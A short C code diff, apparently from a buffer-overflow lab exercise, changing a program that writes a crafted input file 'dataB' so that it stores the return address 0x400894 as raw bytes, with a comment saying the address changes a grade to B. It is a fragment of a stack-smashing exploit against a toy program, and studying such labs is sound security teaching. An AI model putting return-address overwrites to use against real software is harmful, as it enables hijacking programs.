@@ -4,6 +4,7 @@ int main(void)
 {
     FILE *psFile;
     int i;
+    unsigned long returnAddr = 0x400894;
 
     psFile = fopen("dataB", "w");
 
@@ -18,7 +19,7 @@ int main(void)
         putc('\0', psFile);
 
     /* Return address for changing grade to B */
-    fprintf(psFile, "0x400894");
+    fwrite(&returnAddr, sizeof(unsigned long), 1, psFile);
 
     fclose(psFile);
 
